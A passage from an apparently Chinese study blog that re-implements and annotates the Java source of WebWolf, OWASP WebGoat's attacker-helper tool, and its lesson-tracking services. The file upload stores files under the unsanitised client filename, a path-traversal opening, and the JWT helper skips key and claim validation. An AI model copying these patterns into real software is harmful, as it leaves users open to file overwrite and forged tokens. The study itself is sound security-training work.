    public void addResourceHandlers(ResourceHandlerRegistry registry){
        registry.addResourceHandler("/files/**").addResourceLocations("file:///"+fileLocation+"/");
//        意思就是前段浏览器访问路径带有/file/**就转到对应磁盘下读取图片
//        类似于前端访问tomcat webapp下file文件夹中文件
        registry.addResourceHandler("/css/**").addResourceLocations("classpath:/webwolf/static/css/");
        registry.addResourceHandler("/js/**").addResourceLocations("classpath:/webwolf/static/js/");
        registry.addResourceHandler("/images/**").addResourceLocations("classpath:/webwolf/static/images/");


    }
//    当在springboot创建容器时执行
    @PostConstruct
    public void createDirectory(){

        File file  = new File(fileLocation);
        if (!file.exists()){
            file.mkdirs();
        }
    }

}
```

## requests

### Requests

```java
package com.wanan.webgoat.webwolf.requests;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.boot.actuate.trace.http.HttpTrace;
import org.springframework.boot.actuate.trace.http.HttpTrace.Request;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

import java.time.Instant;
import static java.util.stream.Collectors.toList;
@Controller
// 该类代表控制类 控制层 响应层
@RequiredArgsConstructor
//写在类上可以代替@Autowired注解,需要注意的是在注入时需要用final定义,或者使用@notnull注解
@Slf4j
//日志
@RequestMapping(value = "/requests")
//对应请求的路径
public class Requests {
    private final WebWolfTraceRepository traceRepository;
    private final ObjectMapper objectMapper;
    @AllArgsConstructor
//    生成有参构造
    @Getter
    private class Tracert{
        private final Instant date;
        private final String path;
        private final String json;

    }
    @GetMapping
    public ModelAndView get(){
        var model = new ModelAndView("requests");
        var user = (UserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        var traces = traceRepository.findAllTraces().stream()
                .filter(t -> allowedTrace(t,user))
                .map(t -> new Tracert(t.getTimestamp(),path(t),toJsonString(t))).collect(toList());
        model.addObject("traces",traces);
        return model;


    }
    private boolean allowedTrace(HttpTrace t, UserDetails user){
        Request req = t.getRequest();
        boolean allowed = true;
        if (req.getUri().getPath().contains("/files") && !req.getUri().getPath().contains(user.getUsername())){
            allowed = false;
        } else if (req.getUri().getPath().contains("/landing") && req.getUri().getPath()!=null && req.getUri().getQuery().contains("uniqueCode") && !req.getUri().getQuery().contains(StringUtils.reverse(user.getUsername()))){
            allowed = false;
        }
        return allowed;



    }
    private String path(HttpTrace t){
        return (String) t.getRequest().getUri().getPath();
    }
    private String toJsonString(HttpTrace trace){
        try{
            return objectMapper.writeValueAsString(trace);
        }catch (JsonProcessingException e){
            log.error("Unable to create json",e);
        }
        return "No request(s) found";
    }
}
```

### LandingPage

```java
package com.wanan.webgoat.webwolf.requests;

import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.servlet.http.HttpServletRequest;
import java.util.concurrent.Callable;

@Controller
@Slf4j
@RequestMapping("/landing/**")
public class LandingPage {
    @RequestMapping(method = {RequestMethod.POST,RequestMethod.GET,RequestMethod.DELETE,RequestMethod.DELETE,RequestMethod.PATCH,RequestMethod.PUT})
    public Callable<ResponseEntity<?>> ok(HttpServletRequest request){
        return ()->{
            log.trace("Incoming request for: {}",request.getRequestURI());
            return ResponseEntity.ok().build();
        };
    }

}

```

## FileServer

注意导入的WebGoatUser是那个类

```java
package com.wanan.webgoat.webwolf;




import com.wanan.webgoat.webwolf.user.WebGoatUser;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.io.FileUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.view.RedirectView;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import static org.springframework.http.MediaType.ALL_VALUE;

@Controller
//代表控制类 控制层响应层
@Slf4j
public class FileServer {

    @Value("${webwolf.fileserver.location}")
    private String fileLocation;
    @Value("${server.address}")
    private String server;
    @Value("${server.port}")
    private int port;

    @RequestMapping(path= "/file-server-location",consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)
//   consumes 指定处理请求的提交内容类型(Content-Type) 例如application/json text/html
//    produces 指定返回的内容类型,仅当request请求头中Accept类型中包含该指定类型才返回
    @ResponseBody
    public String getFileLocation(){
        return fileLocation;
    }
    @PostMapping(value = "/fileupload")
    public ModelAndView importFile(@RequestParam("file")MultipartFile myFile) throws IOException{
//        MultipartFile 文件上传工具类
        var user = (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
//        用于获取当前对象
        var destinationDir = new File(fileLocation,user.getUsername());
//        新建文件名和文件位置
        destinationDir.mkdirs();
//        mkdirs可以创建多级目录
        myFile.transferTo(new File(destinationDir,myFile.getOriginalFilename()));
        log.debug("File save to {}",new File(destinationDir,myFile.getOriginalFilename()));

        return new ModelAndView(
                new RedirectView("files",true),
                new ModelMap().addAttribute("uploadSuccess","File uploaded successful")

        );
    }
    @AllArgsConstructor
//    生成有参构造
    @Getter
//    生成get方法
    private class UploadedFile{
        private final String name;
        private final String size;
        private final String link;
    }
    @GetMapping(value = "/files")
    public ModelAndView getFiles(HttpServletRequest request){
        WebGoatUser user = (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
//        获取当前用户
        String username = user.getUsername();
        File destinationDir = new File(fileLocation,username);

        ModelAndView modelAndView = new ModelAndView();
//        新建视图层
        modelAndView.setViewName("files");
//        添加视图名称
        File changeIndicatorFile = new File(destinationDir,user.getUsername()+"_changed");
        if (changeIndicatorFile.exists()){
//            如果文件已经存在的话 就添加请求上传成功
            modelAndView.addObject("uploadSuccess",request.getParameter("uploadSuccess"));

        }
        changeIndicatorFile.delete();
//        然后把文件删除
        var uploadedFiles = new ArrayList<>();
        File[] files = destinationDir.listFiles(File::isFile);
        if (files != null){
            for (File file : files){
                String size = FileUtils.byteCountToDisplaySize(file.length());
                String link = String.format("files/%s/%s",username,file.getName());
                uploadedFiles.add(new UploadedFile(file.getName(),size,link));
            }
//            列出文件名并添加进去
        }
        modelAndView.addObject("files",uploadedFiles);
        modelAndView.addObject("webwolf_url","http://"+server+":"+port);
        return modelAndView;
    }


}

```

## mailbox

### Email

```java
package com.wanan.webgoat.webwolf.mailbox;

import com.fasterxml.jackson.annotation.JsonIgnore;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

import javax.persistence.*;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

@Data
//作为数据类
@Builder
//可以链式调用的方式给赋值
@AllArgsConstructor
//生成有参构造
@Entity
//指数据映射到数据库中
@NoArgsConstructor
//生成无参构造
public class Email implements Serializable {
    @Id
    @GeneratedValue(strategy =  GenerationType.IDENTITY)
// 主键自增
    private Long id;
    @JsonIgnore
//    在json时进行忽略
    private LocalDateTime time = LocalDateTime.now();
//    返回当时时区的时间
    @Column(length = 1024)
//    对string类型设置最大长度
    private String contents;
    private String sender;
    private String title;
    private String recipient;

    public String getSummary(){
        return "-" + this.contents.substring(0,Math.min(50,contents.length()));
//        先取contents的长度与50之中的最小值 接着进行截取
    }
    public LocalDateTime getTimestamp(){
        return time;
    }
    public String getTime(){
        return DateTimeFormatter.ofPattern("h:mm a").format(time);
//        进行时间格式化
    }
    public String getShortSender(){
        return sender.substring(0,sender.indexOf("@"));
//        进行截取
    }
}
```

### MailboxController

```java
package com.wanan.webgoat.webwolf.mailbox;

import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import java.util.List;

@RestController
//@RestController 是@controller和@ResponseBody 的结合
//@Controller 将当前修饰的类注入到springboot ioc容器,使得从该类所在的项目跑起来的过程中,这个类就被实例化
//@ResponseBody 它的作用简短的说就是指该类中的api即可返回的数据 不管对应方法返回map或者其他的object,它会以json字符串的形式返回给客户端
@AllArgsConstructor
@Slf4j
public class MailboxController {

    private final MailboxRepository mailboxRepository;

    @GetMapping(value = "/mail")
    public ModelAndView mail(){
        UserDetails user = (UserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
//        获取当前用户名称
        ModelAndView modelAndView = new ModelAndView();
        List<Email> emails = mailboxRepository.findByRecipientOrderByTimeDesc(user.getUsername());
        if (emails != null && !emails.isEmpty()){
            modelAndView.addObject("total",emails.size());
            modelAndView.addObject("emails",emails);

        }
        modelAndView.setViewName("mailbox");
        return modelAndView;
    }
    @PostMapping(value = "/mail")
    public ResponseEntity<?> sendEmail(@RequestBody Email email){
//获取请求体
        mailboxRepository.save(email);
        return ResponseEntity.status(HttpStatus.CREATED).build();

    }

}
```

### MailboxRepository

```java
package com.wanan.webgoat.webwolf.mailbox;

import org.springframework.data.jpa.repository.JpaRepository;

import java.util.List;

public interface MailboxRepository extends JpaRepository<Email,String > {
    List<Email> findByRecipientOrderByTimeDesc(String recipient);


}
```

## jwt

### JWTController

这里进行了修改,不然会造成jwt功能的无法正常使用.注意这里与原版的差异

![image-20220822202924467](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822202924467.png)

```java
package org.owasp.webgoat.webwolf.jwt;

import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import static org.springframework.http.MediaType.APPLICATION_FORM_URLENCODED_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
public class JWTController {

    @GetMapping("/jwt")
    public ModelAndView jwt() {
        return new ModelAndView("jwt");
    }

    @PostMapping(value = "/WebWolf/jwt/decode", consumes = APPLICATION_FORM_URLENCODED_VALUE, produces = APPLICATION_JSON_VALUE)
    public JWTToken decode(@RequestBody MultiValueMap<String, String> formData) {
        var jwt = formData.getFirst("token");
        var secretKey = formData.getFirst("secretKey");
        return JWTToken.decode(jwt, secretKey);
    }

    @PostMapping(value = "/WebWolf/jwt/encode", consumes = APPLICATION_FORM_URLENCODED_VALUE, produces = APPLICATION_JSON_VALUE)
    public JWTToken encode(@RequestBody MultiValueMap<String, String> formData) {
        var header = formData.getFirst("header");
        var payload = formData.getFirst("payload");
        var secretKey = formData.getFirst("secretKey");
        return JWTToken.encode(header, payload, secretKey);
    }

}
```

### JWTToken

```java
package com.wanan.webgoat.webwolf.jwt;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.*;
import org.jose4j.jws.JsonWebSignature;
import org.jose4j.jwt.consumer.InvalidJwtException;
import org.jose4j.jwt.consumer.JwtConsumer;
import org.jose4j.jwt.consumer.JwtConsumerBuilder;
import org.jose4j.jwx.CompactSerializer;
import org.jose4j.keys.HmacKey;
import org.jose4j.lang.JoseException;

import java.util.Map;
import java.util.TreeMap;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.springframework.util.Base64Utils.decodeFromUrlSafeString;
import static org.springframework.util.StringUtils.hasText;
@NoArgsConstructor
//生成无参构造
@AllArgsConstructor
//生成全参构造
@Getter
//生成getter方法
@Setter
//生成setter方法
@Builder(toBuilder = true)
//可连续初始化对象  可以修改这个属性的值
public class JWTToken {
    private String encoded = "";
    private String secretKey;
    private String header;
    private boolean validHeader;
    private boolean validPayload;
    private boolean validToken;
    private String payload;
    private boolean signatureValid = true;

    public static JWTToken decode(String jwt, String secretKey) {
        var token = parseToken(jwt.trim().replace(System.getProperty("line.separator"), ""));
//        先去除字符串两端空格 这里是获取系统换行符接着将jwt中的换行符替换为空
        return token.toBuilder().signatureValid(validateSignature(secretKey, jwt)).build();
    }

    private static Map<String, Object> parse(String header) {
        var reader = new ObjectMapper();
        try {
            return reader.readValue(header, TreeMap.class);
//            这里进行反序列化出了一个treemap对象
        } catch (JsonProcessingException e) {
            return Map.of();
        }


    }

    private static String write(String originalValue, Map<String, Object> data) {
        var writer = new ObjectMapper().writerWithDefaultPrettyPrinter();
        try {
            if (data.isEmpty()) {
//                如果data是空的
                return originalValue;
//                就返回原先的字符串
            }
            return writer.writeValueAsString(data);
//            将传入的对象序列化成json格式
        } catch (JsonProcessingException e) {
            return originalValue;
        }
    }
    public static JWTToken  encode(String header, String payloadAsString, String secretKey) {
        var headers = parse(header);
        var payload = parse(payloadAsString);

        var builder = JWTToken.builder()
                .header(write(header, headers))
                .payload(write(payloadAsString, payload))
                .validHeader(!hasText(header) || !headers.isEmpty())
                .validToken(true)
                .validPayload(!hasText(payloadAsString) || !payload.isEmpty());

        JsonWebSignature jws = new JsonWebSignature();
        jws.setPayload(payloadAsString);
        headers.forEach((k, v) -> jws.setHeader(k, v));
        if (!headers.isEmpty()) { //otherwise e30 meaning {} will be shown as header
            builder.encoded(CompactSerializer.serialize(new String[]{jws.getHeaders().getEncodedHeader(), jws.getEncodedPayload()}));
        }

        //Only sign when valid header and payload
        if (!headers.isEmpty() && !payload.isEmpty() && hasText(secretKey)) {
            jws.setDoKeyValidation(false);
            jws.setKey(new HmacKey(secretKey.getBytes(UTF_8)));
            try {
                builder.encoded(jws.getCompactSerialization());
                builder.signatureValid(true);
            } catch (JoseException e) {
                //Do nothing
            }
        }
        return builder.build();
    }

    public static JWTToken parseToken(String jwt) {

        var token = jwt.split("\\.");
        //        按.分割jwt
        var builder = JWTToken.builder().encoded(jwt);
//        给encoded赋值为jwt
        if (token.length >= 2) {
            var header = new String(decodeFromUrlSafeString(token[0]), UTF_8);
//            先进行base64解码返回一个数组 接着转换成utf-8的形式
            var payloadAsString = new String(decodeFromUrlSafeString(token[1]), UTF_8);
            var headers = parse(header);
            var payload = parse(payloadAsString);
            builder.header(write(header, headers));
            builder.payload(write(payloadAsString, payload));
            builder.validHeader(!headers.isEmpty());

            builder.validPayload(!payload.isEmpty());
            builder.validToken(!headers.isEmpty() && !payload.isEmpty());
        } else {
            builder.validToken(false);
        }
        return builder.build();
    }



    private static boolean validateSignature(String secretKey, String jwt) {
        if (hasText(secretKey)) {
            JwtConsumer jwtConsumer = new JwtConsumerBuilder()
                    .setSkipAllValidators()
                    .setVerificationKey(new HmacKey(secretKey.getBytes(UTF_8)))
                    //                    设置密钥
                    .setRelaxVerificationKeyValidation()
                    .build();
            try {
                jwtConsumer.processToClaims(jwt);
                //                这里是用自定义的密钥去验证jwt
                return true;
            } catch (InvalidJwtException e) {
                return false;
            }
        }
        return false;
    }

}

```

## resources

webwolf静态资源 了解一下 thymeleaf 语法

![image-20220723084922401](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220723084922401.png)

注意这里的静态资源包里面的properties文件其实是html文件中会取出来的变量

![image-20220723093406862](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220723093406862.png)

# container

## service

### EnvironmentService

```java
package com.wanan.webgoat.container.service;

import lombok.RequiredArgsConstructor;
import org.springframework.context.ApplicationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController("/environment")
//@RestController 是@Controller和@ResponseBody的结合
//@Controller 将当前修饰的类注入到springboot ioc容器是的从该类所在的项目pao起来的过程中.这个类就被实例化
//@ResponseBody 它的作用简短的说就是该类中的api即可返回的数据不管对应方法返回map或者其他的object,他会以json字符串的形式返回给客户端
@RequiredArgsConstructor
//所有参数的构造方法
public class EnvironmentService {
    private final ApplicationContext context;
//    用于访问程序资源
    @GetMapping("/server-directory")
    public String homeDirectory(){
        return context.getEnvironment().getProperty("webgoat.server.directory");
//        读取配置文件
    }
}

```

### HintService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.Assignment;
import com.wanan.webgoat.container.lessons.Hint;
import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.session.WebSession;
import org.hibernate.engine.HibernateIterator;
import org.jcodings.util.Hash;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collection;
import java.util.List;

@RestController
public class HintService {
    public static final String URL_HINTS_MVC = "/service/hint.mvc";
    private final WebSession webSession;
    public HintService(WebSession webSession){
        this.webSession = webSession;
    }
    @GetMapping(path = URL_HINTS_MVC,produces = "application/json")
//    返回json数据
    @ResponseBody
    public List<Hint> getHints(){
        Lesson l = webSession.getCurrentLesson();
        return createAssignmentHints(l);
    }

    private List<Hint> createAssignmentHints(Lesson l ){
        if (l!= null){
            return l.getAssignments().stream()
                    .map(this::createHint)
                    .flatMap(Collection::stream)
                    .toList();

        }
        return List.of();
    }
    private List<Hint> createHint(Assignment a){
        return a.getHints().stream().map(h -> new Hint(h,a.getPath())).toList();
    }
}
```

### LabelDebugService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.session.LabelDebugger;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.awt.*;
import java.util.Map;

@Controller
@Slf4j
@AllArgsConstructor
public class LabelDebugService {
    private static final String URL_DEBUG_LABELS_MVC = "/service/debug/labels.mvc";
    private static final String KEY_ENABLED = "enabled";
    private static final String KEY_SUCCESS = "success";

    private LabelDebugger labelDebugger;

    @RequestMapping(path = URL_DEBUG_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE)
    public @ResponseBody ResponseEntity<Map<String,Object>> checkDebuggingStatus(){
        log.debug("Checking label debugging,it is {}",labelDebugger.isEnabled());
        Map<String,Object> result = createResponse(labelDebugger.isEnabled());
        return new ResponseEntity<>(result, HttpStatus.OK);
    }
    @RequestMapping(value = URL_DEBUG_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE,params = KEY_ENABLED)
    public @ResponseBody ResponseEntity<Map<String,Object>> setDebuggingStatus(@RequestParam("enabled") Boolean enabled){
        log.debug("Setting label debugging to {}",labelDebugger.isEnabled());
        Map<String,Object> result =  createResponse(enabled);
        labelDebugger.setEnabled(enabled);
        return new ResponseEntity<>(result,HttpStatus.OK);
    }

    private Map<String,Object> createResponse(Boolean enabled) {
        return Map.of(KEY_SUCCESS,Boolean.TRUE,KEY_ENABLED,enabled);
    }
}
```

### LabelService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.i18n.Messages;
import com.wanan.webgoat.container.i18n.PluginMessages;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.RequestEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.Properties;

@RestController
@Slf4j
@RequiredArgsConstructor
public class LabelService {
    public static final String URL_LABELS_MVC = "/service/labels.mvc";
    private final Messages messages;
    private final PluginMessages pluginMessages;
    @GetMapping(path = URL_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public ResponseEntity<Properties> fetchLeabels(){
        var allProperties = new Properties();
        allProperties.putAll(messages.getMessages());
        allProperties.putAll(pluginMessages.getMessages());
        return new ResponseEntity<>(allProperties, HttpStatus.OK);
    }
}
```

### LessonInfoService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.lessons.LessonInfoModel;
import com.wanan.webgoat.container.session.WebSession;
import lombok.AllArgsConstructor;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AllArgsConstructor
public class LessonInfoService {
    private final WebSession webSession;

    @RequestMapping(path = "/service/lessoninfo.mvc",produces = "application/json")
    public @ResponseBody LessonInfoModel getLessonInfo(){
        Lesson lesson = webSession.getCurrentLesson();
        return new LessonInfoModel(lesson.getTitle(),false,false,false);
    }

}
```

### LessonMenuService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.*;
import com.wanan.webgoat.container.session.Course;
import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.LessonTracker;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import lombok.AllArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.parameters.P;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Map;

@Controller
@AllArgsConstructor
public class LessonMenuService {
    public static final String URL_LESSONMENU_MVC = "/service/lessonmenu.mvc";
    private final Course course;
    private final WebSession webSession;
    private UserTrackerRepository userTrackerRepository;

    @Value("#{'${exclude.categories}'.split(',')}")
    private List<String > excludeCategories;

    @Value("#{'${exclude.lessons}'.split(',')}")
    private List<String > excludeLessons;

    @RequestMapping(path = URL_LESSONMENU_MVC,produces = "application/json")
    public @ResponseBody List<LessonMenuItem> showLeftNav(){
        List<LessonMenuItem> menu = new ArrayList<>();
        List<Category> categories = course.getCategories();
        UserTracker userTracker = userTrackerRepository.findByUser(webSession.getUserName());

        for (Category category: categories){
            if (excludeCategories.contains(category.name())){
                continue;
            }
            LessonMenuItem categoryItem = new LessonMenuItem();
            categoryItem.setName(category.getName());
            categoryItem.setType(LessonMenuItemType.CATEGORY);

            List<Lesson> lessons = course.getLessons(category);
            lessons = lessons.stream().sorted(Comparator.comparing(Lesson::getTitle)).toList();
            for (Lesson lesson:lessons){
                if (excludeLessons.contains(lesson.getName())){
                    continue;
                }
                LessonMenuItem lessonItem = new LessonMenuItem();
                lessonItem.setName(lesson.getTitle());
                lessonItem.setLink(lesson.getLink());
                lessonItem.setType(LessonMenuItemType.LESSON);
                LessonTracker lessonTracker = userTracker.getLessonTracker(lesson);
                boolean lessonSolved = lessonCompleted(lessonTracker.getLessonOverview(),lesson);
                lessonItem.setComplete(lessonSolved);
                categoryItem.addChild(lessonItem);

            }
            categoryItem.getChildren().sort(((o1, o2) -> o1.getRanking() - o2.getRanking()));
            menu.add(categoryItem);


        }
        return menu;
    }
    private boolean lessonCompleted(Map<Assignment,Boolean> map,Lesson currentLesson){
        boolean result = true;
        for (Map.Entry<Assignment,Boolean> entry : map.entrySet()){
            Assignment storedAssignment = entry.getKey();
            for (Assignment lessonAssignment : currentLesson.getAssignments()){
                if (lessonAssignment.getName().equals(storedAssignment.getName())){
                    result = result && entry.getValue();
                    break;
                }
            }
        }
        return result;
    }

}

```

### LessonProgressService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.Assignment;
import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.List;

@Controller
@RequiredArgsConstructor
public class LessonProgressService {
    private final UserTrackerRepository userTrackerRepository;
    private final WebSession webSession;

    @RequestMapping(value = "/service/lessonoverview.mvc",produces = "application/json")
    @ResponseBody
    public List<LessonOverview> lessonOverview(){
        var  userTracker = userTrackerRepository.findByUser(webSession.getUserName());
        var currentLesson = webSession.getCurrentLesson();
        if (currentLesson != null){
            var lessonTracker = userTracker.getLessonTracker(currentLesson);
            return lessonTracker.getLessonOverview().entrySet().stream()
                    .map(entry -> new LessonOverview(entry.getKey(),entry.getValue()))
                    .toList();
        }
        return List.of();
    }
    @AllArgsConstructor
    @Getter
    private static class LessonOverview{
        private Assignment assignment;
        private Boolean solved;
    }
}

```

### LessonTitleService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.session.WebSession;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class LessonTitleService {
    private final WebSession webSession;
    public LessonTitleService(final WebSession webSession){
        this.webSession = webSession;
    }
    @RequestMapping(path = "/service/lessontitle.mvc",produces = "application/html")
    public @ResponseBody String showPlan(){
        Lesson lesson = webSession.getCurrentLesson();
        return lesson != null ? lesson.getTitle() :"";
        
    }
}
```

### ReportCardService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.i18n.PluginMessages;
import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.session.Course;
import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.LessonTracker;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.Setter;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;
import java.util.List;

@Controller
@AllArgsConstructor
public class ReportCardService {
    private final WebSession webSession;
    private final UserTrackerRepository userTrackerRepository;
    private final Course course;
    private final PluginMessages pluginMessages;
    
    @GetMapping(path = "/service/reportcard.mvc",produces = "application/json")
    @ResponseBody
    public ReportCard reportCard(){
        final ReportCard reportCard = new ReportCard();
        reportCard.setTotalNumberOfLessons(course.getTotalOfLessons());
        reportCard.setTotalNumberOfAssignments(course.getTotalOfAssignments());

        UserTracker userTracker = userTrackerRepository.findByUser(webSession.getUserName());
        reportCard.setNumberOfAssignmentsSolved(userTracker.numberOfAssignmentsSolved());
        reportCard.setNumberOfLessonsSolved(userTracker.numberOfLessonsSolved());
        
        for (Lesson lesson : course.getLessons()){
            LessonTracker lessonTracker = userTracker.getLessonTracker(lesson);
            final LessonStatistics lessonStatistics = new LessonStatistics();
            lessonStatistics.setName(pluginMessages.getMessage(lesson.getTitle()));
            lessonStatistics.setNumberOfAttempts(lessonTracker.getNumberOfAttempts());
            lessonStatistics.setSolved(lessonTracker.isLessonSolved());
            reportCard.lessonStatistics.add(lessonStatistics);
            
        }
        return reportCard;
    }
    @Getter
    @Setter
    private final class ReportCard{
        private int totalNumberOfLessons;
        private int totalNumberOfAssignments;
        private int solvedLessons;
        private int numberOfAssignmentsSolved;
        private int numberOfLessonsSolved;
        private List<LessonStatistics> lessonStatistics =  new ArrayList<>();
    }
    @Setter
    @Getter
    private final class LessonStatistics{
        private String name;
        private boolean solved;
        private int numberOfAttempts;
    } 
}
```

### RestartLessonService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.lessons.Initializeable;
import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.flywaydb.core.Flyway;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.ResponseStatus;

import java.util.List;
import java.util.function.Function;

@Controller
@AllArgsConstructor
@Slf4j
public class RestartLessonService {
    private final WebSession webSession;
    private final UserTrackerRepository userTrackerRepository;
    private final Function<String , Flyway> flywayLessons;
    private final List<Initializeable> lessonsToInitialize;
    
    @RequestMapping(path = "/service/restartlesson.mvc",produces = "text/text")
    @ResponseStatus(value = HttpStatus.OK)
    public void restartLesson(){
        Lesson al = webSession.getCurrentLesson();
        log.debug("Restarting lesson: ",al);

        UserTracker userTracker = userTrackerRepository.findByUser(webSession.getUserName());
        userTracker.reset(al);
        userTrackerRepository.save(userTracker);
        var flyway = flywayLessons.apply(webSession.getUserName());
        flyway.clean();
        flyway.migrate();
        lessonsToInitialize.forEach(i->i.initialize(webSession.getUser()));
    }
    
}
```

### SessionService

```java
package com.wanan.webgoat.container.service;

import com.wanan.webgoat.container.i18n.Messages;
import com.wanan.webgoat.container.session.WebSession;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequiredArgsConstructor
public class SessionService {
    private final WebSession webSession;
    private final RestartLessonService restartLessonService;
    private final Messages messages;
    @RequestMapping(path = "/service/enable-security.mvc",produces = "application/json")
    @ResponseBody
    public String applySecurity(){
        webSession.toggleSecurity();
        restartLessonService.restartLesson();
        
        var msg = webSession.isSecurityEnable() ? "security.enabled":"security.disabled";
